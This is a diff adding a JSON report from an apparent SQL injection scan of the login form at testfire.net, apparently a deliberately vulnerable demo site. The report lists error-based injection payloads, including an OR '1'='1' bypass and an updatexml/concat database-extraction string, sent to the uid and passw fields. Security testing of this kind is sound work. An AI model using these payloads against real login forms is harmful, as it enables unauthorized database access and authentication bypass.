@@ -1,0 +1,47 @@
+{
+  "target": "http://testfire.net/login.jsp",
+  "issues": [
+    {
+      "param": "uid",
+      "payload": "'",
+      "evidence": "Matched SQL error signature: syntax error (form field: uid)",
+      "kind": "error-based (form)",
+      "timestamp": 1760630986.565629
+    },
+    {
+      "param": "uid",
+      "payload": "') OR ('1'='1",
+      "evidence": "Matched SQL error signature: syntax error (form field: uid)",
+      "kind": "error-based (form)",
+      "timestamp": 1760630987.842464
+    },
+    {
+      "param": "uid",
+      "payload": "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ",
+      "evidence": "Matched SQL error signature: syntax error (form field: uid)",
+      "kind": "error-based (form)",
+      "timestamp": 1760630988.096674
+    },
+    {
+      "param": "passw",
+      "payload": "'",
+      "evidence": "Matched SQL error signature: syntax error (form field: passw)",
+      "kind": "error-based (form)",
+      "timestamp": 1760630989.628741
+    },
+    {
+      "param": "passw",
+      "payload": "') OR ('1'='1",
+      "evidence": "Matched SQL error signature: syntax error (form field: passw)",
+      "kind": "error-based (form)",
+      "timestamp": 1760630990.9012759
+    },
+    {
+      "param": "passw",
+      "payload": "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) -- ",
+      "evidence": "Matched SQL error signature: syntax error (form field: passw)",
+      "kind": "error-based (form)",
+      "timestamp": 1760630991.158402
+    }
+  ]
+}
